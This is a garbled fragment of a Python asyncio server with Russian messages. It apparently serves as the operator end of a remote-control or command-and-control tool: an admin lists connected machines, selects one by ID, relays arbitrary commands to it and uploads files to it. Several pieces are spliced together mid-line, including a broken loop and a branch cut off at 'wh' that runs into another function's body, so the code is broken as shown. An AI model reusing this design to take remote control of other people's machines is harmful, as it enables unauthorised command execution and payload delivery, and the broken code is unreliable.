

                    msg_data = await reader.read(1024)
                    if not msg_data:
                        break
                    msg = msg_data.decode().strip()
                    print(msg)

                    for cl in clients:
      
                        writer.write("Нет такого ID".encode())
                        await writer.drain()
                
                elif message[0] == 'send':
                    await sms(admin, clients)

                elif message[0] == "list":
                    writer.write("Устройства в сети: \n".encode())
                    for i, client in enumerate(clients):
                        writer.write(f"{i}:{client['name']} \n".encode())

                else:
                    writer.write(f"Неизвестная команда: {message}\n".encode())
                    await writer.drain()
        except Exception as e:
            print(f"[!] Ошибка (admin): {e}")
        finally:
            if admin and admin['writer'] == writer:
                admin = None
            writer.close()
            await writer.wait_closed()

    else:
        client = {
            'reader': reader,
            'writer': writer,
            'name': f"{addr[0]}:{addr[1]}"
        }
        clients.append(client)
        print(f"[+] Клиент подключился: {client['name']}")
        try:
            wh
    writer = admin['writer']
    reader = admin['reader']

    # Показать список клиентов
    writer.write("Выберите ID клиента из списка:\n".encode())
    for i, client in enumerate(clients):
        writer.write(f"{i}: {client['name']}\n".encode())
    writer.write("Введите ID клиента: ".encode())
    await writer.drain()

    # Получить выбор ID
    id_data = await reader.read(1024)
    if not id_data:
        return
    try:
        client_id = int(id_data.decode().strip())
        client = clients[client_id]
    except (ValueError, IndexError):
        writer.write("Неверный ID клиента.\n".encode())
        await writer.drain()
        return

    # Отправка команд выбранному клиенту
    writer.write(f"Отправляйте команды клиенту {client['name']} (введите 'exit' для выхода):\n".encode())
    await writer.drain()

    while True:
        writer.write(">>> ".encode())
        await writer.drain()

        cmd_data = await reader.read(1024)
        if not cmd_data:
            break
        cmd = cmd_data.decode().strip()

        if cmd.lower() == "exit":
            writer.write("Выход из режима отправки команд.\n".encode())
            await writer.drain()
            break
        
        if cmd.lower() == "upload file":
            # Получаем от админа file_info

            client['writer'].write('upload file'.encode())
            await client['writer'].drain()

            file_info = await reader.read(1024)
            file_info = file_info.decode().strip()
            file_name, file_size = file_info.split(' | ')
            file_size = int(file_size)

            # Пересылаем file_info клиенту
            client['writer'].write(file_info.encode())
            await client['writer'].drain()

            # Подтверждаем админу, что можно отправлять файл

            # Принимаем файл от админа и пересылаем клиенту
            received = 0
            while received < file_size:
                chunk = await reader.read(min(4096, file_size - received))
                if not chunk:
                    break
                client['writer'].write(chunk)
                await client['writer'].drain()
                received += len(chunk)
            continue # что бы код начался заново

        try:
            client['writer'].write(cmd.encode())
            await client['writer'].drain()

        except Exception as e:
            writer.write(f"[!] Ошибка при отправке сообщения клиенту: {e}\n".encode())
            await writer.drain()
            break

async def main():
    server = await asyncio.start_server(handle_client, ip, port)
    print(f"[*] Сервер запущен на {ip}:{port}")
    async with server:
        await server.serve_forever()

if __name__ == "__main__":
    asyncio.run(main())

